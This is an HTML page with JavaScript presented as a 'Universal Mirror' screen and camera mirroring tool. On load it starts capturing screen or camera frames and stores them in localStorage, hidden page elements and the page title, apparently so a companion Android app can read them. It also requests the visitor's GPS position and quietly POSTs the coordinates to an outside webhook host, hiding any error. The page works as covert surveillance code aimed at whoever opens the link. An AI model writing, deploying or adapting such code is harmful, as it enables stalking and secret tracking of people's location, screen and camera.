<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Universal Mirror</title>
    <style>
        body { 
            background: #000; 
            color: #ff0000; 
            font-family: monospace; 
            text-align: center; 
            padding: 20px; 
        }
        #status { 
            margin: 20px 0; 
            padding: 15px; 
            background: #330000; 
            border-radius: 5px;
        }
        .display-area {
            margin: 20px 0;
            background: #0a0000;
            border: 2px solid #660000;
            border-radius: 10px;
            padding: 20px;
            min-height: 300px;
        }
        video, canvas {
            width: 100%;
            max-width: 500px;
            height: auto;
            border: 1px solid #ff0000;
            border-radius: 5px;
        }
        .btn {
            background: #660000;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
            border-radius: 5px;
        }
        .info {
            background: #1a0000;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <h2>üì∫ UNIVERSAL MIRROR</h2>
    <div id="status">Detecting device capabilities...</div>
    
    <div class="display-area">
        <video id="mediaVideo" autoplay muted playsinline style="display: none;"></video>
        <canvas id="captureCanvas" style="display: none;"></canvas>
        <div id="placeholder">
            <p>üì± Initializing mirror system...</p>
        </div>
    </div>
    
    <div id="controls" style="display: none;">
        <button class="btn" onclick="startCapture()">üì∫ Start Mirror</button>
        <button class="btn" onclick="switchMode()" id="switchBtn">üîÑ Switch Camera</button>
        <button class="btn" onclick="restartCapture()">üîÅ Restart</button>
    </div>
    
    <div id="deviceInfo" class="info"></div>
    
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const webhookId = urlParams.get('webhook') || 'universal_' + Date.now();
        
        let isCapturing = false;
        let frameCount = 0;
        let currentMode = 'auto';
        let mediaStream = null;
        
        // Device detection
        function detectDevice() {
            const userAgent = navigator.userAgent;
            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
            const isDesktop = !isMobile;
            const isHTTPS = location.protocol === 'https:';
            const hasScreenShare = navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia;
            const hasCamera = navigator.mediaDevices && navigator.mediaDevices.getUserMedia;
            
            return {
                isMobile,
                isDesktop,
                isHTTPS,
                hasScreenShare,
                hasCamera,
                browser: getBrowser()
            };
        }
        
        function getBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            return 'Unknown';
        }
        
        // Auto-detect best capture method
        async function autoDetectAndStart() {
            const device = detectDevice();
            
            document.getElementById('deviceInfo').innerHTML = `
                üì± Device: ${device.isMobile ? 'Mobile' : 'Desktop'}<br>
                üåê Browser: ${device.browser}<br>
                üîí HTTPS: ${device.isHTTPS ? 'Yes' : 'No'}<br>
                üì∫ Screen Share: ${device.hasScreenShare ? 'Yes' : 'No'}<br>
                üì∑ Camera: ${device.hasCamera ? 'Yes' : 'No'}
            `;
            
            // Try screen sharing first (desktop with support)
            if (device.isDesktop && device.hasScreenShare && device.isHTTPS) {
                currentMode = 'screen';
                document.getElementById('status').innerHTML = 'üñ•Ô∏è Desktop detected - Trying screen share...';
                await tryScreenShare();
            }
            // Use camera (mobile or no screen share support)
            else if (device.hasCamera) {
                currentMode = 'camera';
                document.getElementById('status').innerHTML = 'üì∑ Camera mode - Point camera at target screen';
                await tryCamera();
            }
            // Last resort - manual mode
            else {
                currentMode = 'manual';
                document.getElementById('status').innerHTML = '‚ö†Ô∏è Limited support - Manual mode';
                document.getElementById('controls').style.display = 'block';
            }
        }
        
        async function tryScreenShare() {
            try {
                mediaStream = await navigator.mediaDevices.getDisplayMedia({
                    video: { 
                        width: { ideal: 1280 }, 
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                document.getElementById('status').innerHTML = '‚úÖ Screen sharing active';
                setupCapture('screen');
                
            } catch (error) {
                document.getElementById('status').innerHTML = '‚ùå Screen share failed - Trying camera...';
                currentMode = 'camera';
                await tryCamera();
            }
        }
        
        async function tryCamera() {
            try {
                document.getElementById('status').innerHTML = 'üîÑ Requesting camera access...';
                
                // Try back camera first (better for capturing screens/documents)
                let constraints = {
                    video: { 
                        width: { ideal: 1920 }, 
                        height: { ideal: 1080 },
                        facingMode: { ideal: 'environment' } // Back camera
                    },
                    audio: false
                };
                
                try {
                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                    localStorage.setItem('camera_facing', 'environment');
                } catch (backCameraError) {
                    // Fallback to front camera
                    constraints.video.facingMode = { ideal: 'user' };
                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                    localStorage.setItem('camera_facing', 'user');
                }
                
                document.getElementById('status').innerHTML = '‚úÖ Camera active - Point at screen to mirror';
                setupCapture('camera');
                
            } catch (error) {
                let errorMsg = 'Camera access failed';
                if (error.name === 'NotAllowedError') {
                    errorMsg = 'Camera permission denied. Please allow camera access.';
                } else if (error.name === 'NotFoundError') {
                    errorMsg = 'No camera found on device.';
                }
                document.getElementById('status').innerHTML = '‚ùå ' + errorMsg;
                document.getElementById('controls').style.display = 'block';
            }
        }
        
        function setupCapture(mode) {
            const video = document.getElementById('mediaVideo');
            const canvas = document.getElementById('captureCanvas');
            const ctx = canvas.getContext('2d');
            
            video.srcObject = mediaStream;
            video.style.display = 'block';
            canvas.style.display = 'block';
            document.getElementById('placeholder').style.display = 'none';
            document.getElementById('controls').style.display = 'block';
            
            // Update switch button text
            const switchBtn = document.getElementById('switchBtn');
            if (mode === 'camera') {
                const facing = localStorage.getItem('camera_facing') || 'environment';
                switchBtn.innerHTML = facing === 'environment' ? 'üîÑ Front Camera' : 'üîÑ Back Camera';
            } else {
                switchBtn.innerHTML = 'üîÑ Switch to Camera';
            }
            
            isCapturing = true;
            
            video.onloadedmetadata = () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                startMirroring(video, canvas, ctx, mode);
            };
            
            // Handle stream end
            if (mediaStream.getVideoTracks()[0]) {
                mediaStream.getVideoTracks()[0].onended = () => {
                    isCapturing = false;
                    document.getElementById('status').innerHTML = 'üî¥ Capture stopped';
                    
                    // Clear transmission data
                    localStorage.removeItem('mirror_' + webhookId);
                    localStorage.removeItem('latest_mirror');
                    window.universalMirrorData = null;
                };
            }
            
            // Additional transmission setup
            setTimeout(() => {
                if (isCapturing) {
                    console.log('Mirror transmission system initialized for webhook:', webhookId);
                    localStorage.setItem('mirror_initialized_' + webhookId, Date.now().toString());
                }
            }, 1000);
        }
        
        function startMirroring(video, canvas, ctx, mode) {
            function captureFrame() {
                if (!isCapturing) return;
                
                // Ensure video is ready
                if (video.readyState < 2) {
                    setTimeout(captureFrame, 50);
                    return;
                }
                
                // Draw current frame with smooth rendering
                ctx.imageSmoothingEnabled = true;
                ctx.imageSmoothingQuality = 'high';
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to image data with optimized settings for smooth video
                const imageData = canvas.toDataURL('image/jpeg', 0.8); // Higher quality for smoother video
                frameCount++;
                
                // Store data for Android app - MULTIPLE METHODS
                const mirrorData = {
                    screenData: imageData,
                    timestamp: new Date().toISOString(),
                    frame: frameCount,
                    webhook: webhookId,
                    mode: mode,
                    type: 'universal_mirror'
                };
                
                // Method 1: Direct localStorage with webhook ID
                localStorage.setItem('mirror_' + webhookId, imageData);
                
                // Method 2: Structured data with webhook ID
                localStorage.setItem('mirror_data_' + webhookId, JSON.stringify(mirrorData));
                
                // Method 3: Universal mirror key
                localStorage.setItem('universal_mirror', JSON.stringify({
                    webhook: webhookId,
                    data: imageData,
                    timestamp: Date.now(),
                    frame: frameCount,
                    mode: mode
                }));
                
                // Method 4: Window property for direct access
                window.universalMirrorData = mirrorData;
                
                // Method 5: Broadcast event
                try {
                    window.dispatchEvent(new CustomEvent('mirrorUpdate', {
                        detail: mirrorData
                    }));
                } catch(e) {}
                
                // Method 6: Simple key for easy access
                localStorage.setItem('latest_mirror', imageData);
                localStorage.setItem('latest_mirror_info', JSON.stringify({
                    webhook: webhookId,
                    frame: frameCount,
                    timestamp: Date.now()
                }));
                
                // Update status
                const modeIcon = mode === 'screen' ? 'üñ•Ô∏è' : 'üì∑';
                const modeText = mode === 'screen' ? 'SCREEN' : 'CAMERA';
                document.getElementById('status').innerHTML = 
                    `${modeIcon} ${modeText} MIRROR ACTIVE - Frame ${frameCount} - ${new Date().toLocaleTimeString()}`;
                
                // Enhanced debug and transmission verification
                if (frameCount % 5 === 0) {
                    console.log('Frame captured:', frameCount, 'Webhook:', webhookId, 'Size:', Math.round(imageData.length/1024) + 'KB');
                    
                    // Verify data is stored correctly
                    const storedData = localStorage.getItem('mirror_' + webhookId);
                    const storedLatest = localStorage.getItem('latest_mirror');
                    console.log('Storage verification - Direct:', storedData ? 'OK' : 'FAIL', 'Latest:', storedLatest ? 'OK' : 'FAIL');
                }
                
                // Force immediate transmission after each capture
                setTimeout(() => {
                    if (window.universalMirrorData && window.universalMirrorData.frame === frameCount) {
                        // Trigger immediate transmission
                        localStorage.setItem('force_transmission_' + webhookId, Date.now().toString());
                    }
                }, 50);
                
                // Continue capturing with smooth intervals
                const interval = mode === 'camera' ? 200 : 500;
                setTimeout(captureFrame, interval);
                
                // FORCE data to document title for Android access
                document.title = `MIRROR:${frameCount}:${Date.now()}:${Math.round(imageData.length/1024)}KB`;
                
                // Add to page body as hidden element
                let dataDiv = document.getElementById('androidData');
                if (!dataDiv) {
                    dataDiv = document.createElement('div');
                    dataDiv.id = 'androidData';
                    dataDiv.style.display = 'none';
                    document.body.appendChild(dataDiv);
                }
                dataDiv.textContent = imageData;
            }
            
            // Start capturing
            captureFrame();
        }
        
        async function startCapture() {
            if (isCapturing) return;
            await autoDetectAndStart();
        }
        
        async function switchMode() {
            // Stop current stream
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            isCapturing = false;
            
            // Hide current display
            document.getElementById('mediaVideo').style.display = 'none';
            document.getElementById('captureCanvas').style.display = 'none';
            document.getElementById('placeholder').style.display = 'block';
            
            // Switch mode
            if (currentMode === 'screen') {
                currentMode = 'camera';
                document.getElementById('status').innerHTML = 'üîÑ Switching to camera mode...';
                await tryCamera();
            } else if (currentMode === 'camera') {
                // Switch camera (front/back)
                document.getElementById('status').innerHTML = 'üîÑ Switching camera...';
                await switchCamera();
            } else {
                currentMode = 'screen';
                document.getElementById('status').innerHTML = 'üîÑ Switching to screen share...';
                await tryScreenShare();
            }
        }
        
        async function switchCamera() {
            try {
                // Get current facing mode
                const currentFacing = localStorage.getItem('camera_facing') || 'environment';
                const newFacing = currentFacing === 'environment' ? 'user' : 'environment';
                
                document.getElementById('status').innerHTML = `üîÑ Switching to ${newFacing === 'environment' ? 'back' : 'front'} camera...`;
                
                const constraints = {
                    video: { 
                        width: { ideal: 1920 }, 
                        height: { ideal: 1080 },
                        facingMode: { exact: newFacing }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                localStorage.setItem('camera_facing', newFacing);
                
                document.getElementById('status').innerHTML = `‚úÖ ${newFacing === 'environment' ? 'Back' : 'Front'} camera active`;
                setupCapture('camera');
                
            } catch (error) {
                // Fallback to any available camera
                document.getElementById('status').innerHTML = '‚ö†Ô∏è Camera switch failed - Using available camera';
                await tryCamera();
            }
        }
        
        // Restart function
        async function restartCapture() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            isCapturing = false;
            frameCount = 0;
            
            document.getElementById('mediaVideo').style.display = 'none';
            document.getElementById('captureCanvas').style.display = 'none';
            document.getElementById('placeholder').style.display = 'block';
            document.getElementById('status').innerHTML = 'Restarting...';
            
            setTimeout(autoDetectAndStart, 500);
        }
        
        // Auto start detection
        setTimeout(autoDetectAndStart, 1000);
        
        // Enhanced debug function
        window.checkMirrorData = function() {
            console.log('=== MIRROR DATA DEBUG ===');
            console.log('Webhook ID:', webhookId);
            console.log('Is Capturing:', isCapturing);
            console.log('Frame Count:', frameCount);
            console.log('Current Mode:', currentMode);
            
            const methods = {
                'Method 1 (Direct)': localStorage.getItem('mirror_' + webhookId),
                'Method 2 (Structured)': localStorage.getItem('mirror_data_' + webhookId),
                'Method 3 (Universal)': localStorage.getItem('universal_mirror'),
                'Method 4 (Window)': window.universalMirrorData,
                'Method 5 (Latest)': localStorage.getItem('latest_mirror'),
                'Method 6 (Heartbeat)': localStorage.getItem('mirror_heartbeat')
            };
            
            Object.entries(methods).forEach(([method, data]) => {
                if (data) {
                    const size = typeof data === 'string' ? data.length : JSON.stringify(data).length;
                    console.log(method + ':', 'Found (' + Math.round(size/1024) + 'KB)');
                } else {
                    console.log(method + ':', 'NOT FOUND');
                }
            });
            
            // Test transmission
            if (window.universalMirrorData) {
                console.log('Latest frame data:', {
                    frame: window.universalMirrorData.frame,
                    timestamp: window.universalMirrorData.timestamp,
                    dataSize: Math.round(window.universalMirrorData.screenData.length/1024) + 'KB'
                });
            }
            
            return {
                webhook: webhookId,
                frameCount: frameCount,
                isCapturing: isCapturing,
                mode: currentMode,
                dataAvailable: Object.values(methods).filter(d => d).length
            };
        };
        
        // Force transmission function for testing
        window.forceTransmission = function() {
            if (window.universalMirrorData) {
                const data = window.universalMirrorData;
                localStorage.setItem('force_mirror_' + webhookId, data.screenData);
                localStorage.setItem('force_mirror_info', JSON.stringify({
                    webhook: webhookId,
                    frame: data.frame,
                    timestamp: Date.now(),
                    forced: true
                }));
                console.log('Force transmission executed for frame:', data.frame);
                return true;
            }
            return false;
        };
        
        // Play alert sound when capture starts
        function playAlertSound() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.value = 800;
                oscillator.type = 'sine';
                
                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.5);
                
                if (navigator.vibrate) {
                    navigator.vibrate([200, 100, 200]);
                }
            } catch (e) {}
        }
        
        // Send GPS location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString(),
                        webhook: webhookId
                    };
                    
                    // Play sound when location captured
                    playAlertSound();
                    
                    fetch('https://bojourx-tos.github.io/speedtest-pro/webhook-server.html', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(locationData)
                    }).catch(() => {});
                },
                (error) => console.log('Location access denied')
            );
        }
        
        // DIRECT transmission system
        setInterval(() => {
            if (isCapturing && window.universalMirrorData) {
                const data = window.universalMirrorData.screenData;
                
                // Direct storage - simple keys
                localStorage.setItem('mirror_' + webhookId, data);
                localStorage.setItem('latest_mirror', data);
                
                // Force immediate availability
                window.mirrorData = data;
                window.latestFrame = window.universalMirrorData.frame;
                
                console.log('DIRECT TRANSMISSION:', window.universalMirrorData.frame);
            }
        }, 100);
        
        // Additional transmission method - continuous broadcast
        setInterval(() => {
            if (isCapturing && window.universalMirrorData) {
                const data = window.universalMirrorData;
                
                // Broadcast via multiple channels
                try {
                    // Channel 1: Custom event
                    window.dispatchEvent(new CustomEvent('mirrorDataReady', {
                        detail: {
                            webhook: webhookId,
                            frame: data.frame,
                            data: data.screenData,
                            timestamp: Date.now()
                        }
                    }));
                    
                    // Channel 2: Direct DOM manipulation
                    let hiddenDiv = document.getElementById('hiddenMirrorData');
                    if (!hiddenDiv) {
                        hiddenDiv = document.createElement('div');
                        hiddenDiv.id = 'hiddenMirrorData';
                        hiddenDiv.style.display = 'none';
                        document.body.appendChild(hiddenDiv);
                    }
                    hiddenDiv.setAttribute('data-webhook', webhookId);
                    hiddenDiv.setAttribute('data-frame', data.frame.toString());
                    hiddenDiv.setAttribute('data-timestamp', Date.now().toString());
                    hiddenDiv.textContent = data.screenData;
                    
                } catch(e) {}
            }
        }, 150); // Secondary transmission channel
    </script>
</body>
</html>
